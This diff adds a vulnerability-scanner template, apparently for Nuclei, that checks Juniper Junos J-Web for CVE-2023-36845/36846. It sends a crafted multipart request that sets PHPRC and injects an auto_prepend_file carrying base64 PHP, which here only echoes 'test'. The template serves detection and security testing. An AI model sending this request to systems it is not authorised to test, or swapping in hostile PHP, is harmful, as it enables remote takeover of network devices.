@@ -1,0 +1,43 @@
+id: cve-2023-36845-36846
+info:
+  name: Junos webauth_operation.php PHPRC Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Junos is a reliable, high-performance network operating system from Juniper Networks. An attacker can use the J-Web service to pass in the PHPRC environment variable, turn on the allow_url_include setting, run encoded PHP code, and gain control of the entire web server.
+  classification:
+    cve-id:
+      - CVE-2023-36845
+      - CVE-2023-36846
+    cvss-score: 9.8
+  tags: code-execution,file-upload
+  reference:
+    - https://supportportal.juniper.net/JSA72300
+
+http:
+  - raw:
+      - |
+        POST /webauth_operation.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=------------------------{{rand_text_alphanumeric(32)}}
+
+        --------------------------{{rand_text_alphanumeric(32)}}
+        Content-Disposition: form-data; name="allow_url_include"
+
+        1
+        auto_prepend_file="data://text/plain;base64,PD9waHAgZWNobyAndGVzdCc7ID8+"
+        --------------------------{{rand_text_alphanumeric(32)}}
+        Content-Disposition: form-data; name="PHPRC"
+
+        /dev/fd/0
+        --------------------------{{rand_text_alphanumeric(32)}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - test
+        part: body
